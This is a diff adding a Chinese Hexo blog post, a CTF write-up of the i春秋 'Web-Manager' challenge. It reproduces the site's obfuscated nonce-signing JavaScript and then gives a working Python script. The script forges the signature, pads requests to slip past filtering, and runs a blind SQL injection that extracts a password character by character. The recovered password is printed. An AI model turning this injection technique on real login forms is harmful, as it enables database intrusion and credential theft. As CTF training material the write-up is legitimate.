@@ -1,0 +1,363 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>i春秋:Web-Manager - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="
+发现_nonce
+扫描后台：
+进入
+url/sources/login.js
+$(document).keydown(function(e) {
+    if (e.keyCode == 222 ,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">i春秋:Web-Manager</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">i春秋:Web-Manager</h1>
+        <div class="stuff">
+            <span>六月 02, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/i%E6%98%A5%E7%A7%8B/" rel="tag">i春秋</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603184940414.png" alt="image-20210603184940414"></p>
+<p>发现_nonce</p>
+<p>扫描后台：</p>
+<p>进入</p>
+<pre><code>url/sources/login.js</code></pre>
+<pre><code>$(document).keydown(function(e) {
+    if (e.keyCode == 222 || e.keyCode == 188 || e.keyCode == 190) {
+        alert("Illegal character");
+        return false;
+    }
+});
+
+function getnonce() {
+    var text = "";
+    var possible = "0123456789abcdef";
+    for (var i = 0; i &lt; 40; i++)
+        text += possible.charAt(Math.floor(Math.random() * possible.length));
+    return text;
+}
+$('#submit').click(function() {
+    this._nonce = getnonce();
+});</code></pre>
+<pre><code>url/sources/bootstrap.js</code></pre>
+<pre><code>  $(document).on('click.bs.alert.data-api', dismiss, Alert.prototype.close)
+
+}(jQuery);
+
+function sign (data, key) {
+    var privateKey
+    var i, j
+    var W = new Array(80)
+    var A, B, C, D, E
+    var H0 = 0x97B5D3F1
+    var H1 = 0x1F3D5B79
+    var H2 = 0x684A2C0E
+    var H3 = 0xE0C2A486
+    var H4 = 0x33221100
+    var H5 = 0xF0F0F0F0
+    var temp
+    var _RSA = function (n, s) {
+        var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))
+        return t4
+    }
+    var _Rot = function (val) {
+        var str = ''
+        var i
+        var v
+        for (i = 7; i &gt;= 0; i--) {
+            v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f
+            str += v.toString(16)
+        }
+        return str
+    }
+    str = unescape(encodeURIComponent(key + data))
+    var strLen = str.length
+    var wordArray = []
+    for (i = 0; i &lt; strLen - 3; i += 4) {
+        j = str.charCodeAt(i) &lt;&lt; 24 |
+            str.charCodeAt(i + 1) &lt;&lt; 16 |
+            str.charCodeAt(i + 2) &lt;&lt; 8 |
+            str.charCodeAt(i + 3)
+        wordArray.push(j)
+    }
+    switch (strLen % 4) {
+        case 0:
+            i = 0x080000000
+            break
+        case 1:
+            i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000
+            break
+        case 2:
+            i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000
+            break
+        case 3:
+            i = str.charCodeAt(strLen - 3) &lt;&lt; 24 |
+                str.charCodeAt(strLen - 2) &lt;&lt; 16 |
+                str.charCodeAt(strLen - 1) &lt;&lt;
+            8 | 0x80
+            break
+    }
+    wordArray.push(i)
+    while ((wordArray.length % 16) !== 14) {
+        wordArray.push(0)
+    }
+    wordArray.push(strLen &gt;&gt;&gt; 29)
+    wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff)
+    H0 ^= H5
+    H1 ^= H5
+    H2 ^= H5
+    H3 ^= H5
+    H4 ^= H5
+    for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) {
+        for (i = 0; i &lt; 16; i++) {
+            W[i] = wordArray[privateKey + i]
+        }
+        for (i = 16; i &lt;= 79; i++) {
+            W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)
+        }
+        A = H0
+        B = H1
+        C = H2
+        D = H3
+        E = H4
+        for (i = 0; i &lt;= 19; i++) {
+            temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff
+            E = D
+            D = C
+            C = _RSA(B, 30)
+            B = A
+            A = temp
+        }
+        for (i = 20; i &lt;= 39; i++) {
+            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff
+            E = D
+            D = C
+            C = _RSA(B, 30)
+            B = A
+            A = temp
+        }
+        for (i = 40; i &lt;= 59; i++) {
+            temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff
+            E = D
+            D = C
+            C = _RSA(B, 30)
+            B = A
+            A = temp
+        }
+        for (i = 60; i &lt;= 79; i++) {
+            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff
+            E = D
+            D = C
+            C = _RSA(B, 30)
+            B = A
+            A = temp
+        }
+        H0 = (H0 + A) &amp; 0x0ffffffff
+        H1 = (H1 + B) &amp; 0x0ffffffff
+        H2 = (H2 + C) &amp; 0x0ffffffff
+        H3 = (H3 + D) &amp; 0x0ffffffff
+        H4 = (H4 + E) &amp; 0x0ffffffff
+    }
+    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)
+    return temp.toLowerCase()
+
+}
+
+
+$(document).ready(function() {
+    $("#" + "f" + "r" + "m" + "l" + "o" + "g" + "i" + "n").submit(function(e) {
+        var z1 = $("#" + "u" + "s" + "e" + "r" + "n" + "a" + "m" + "e").val();
+        var z2 = $("#" + "p" + "a" + "s" + "s" + "w" + "o" + "r" + "d").val();
+        $('&lt;' + 'i' + 'n' + 'p' + 'u' + 't' + '&gt;').attr({
+            type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n',
+            name: '_' + 'n' + 'o' + 'n' + 'c' + 'e',
+            value: sign(z1 + z2, "YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")
+        }).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n');
+    });
+});</code></pre>
+<p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603183639838.png" alt="image-20210603183639838"></p>
+<p>这里是对于sign的调用和_nonce的形成</p>
+<p>通过sign()函数可以得到key 和 data 拼接方式。<br> str = unescape(encodeURIComponent(key + data))</p>
+<p>用脚本吧：</p>
+<pre><code>import hashlib
+import requests
+url = "http://03581832d20d4ab59fe85fa2480f3ffce5f10e0fd8d040d7.changame.ichunqiu.com/login.php"
+
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+suffix = "YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD=="
+
+temp = ""
+
+for i in range(1, 50):
+    # 所有可见字符
+    for j in range(32, 127):
+        # 字段名包含特殊字符
+        payload = "'or ascii(substr(`p@ssw0rd`,{},1)) = {}#".format(
+            i, j)
+
+        info = suffix + payload + "1"
+        nonce = hashlib.sha1(info.encode("utf-8")).hexdigest()
+        data = "username={}&amp;password=1&amp;submit=&amp;_nonce={}&amp;a={}".format(payload, nonce, "a" * 21000)
+
+        r = requests.post(url, headers=headers, data=data)
+        # 猜测成功的请求长度为782
+        if "Incorrect password" in r.content.decode("utf-8"):
+            temp += chr(j)
+            print(temp)
+            break</code></pre>
+<pre><code>MyIchunq1uSuperL0ng&amp;&amp;SecurePa$$word</code></pre>
+<p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603190858995.png" alt="image-20210603190858995"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
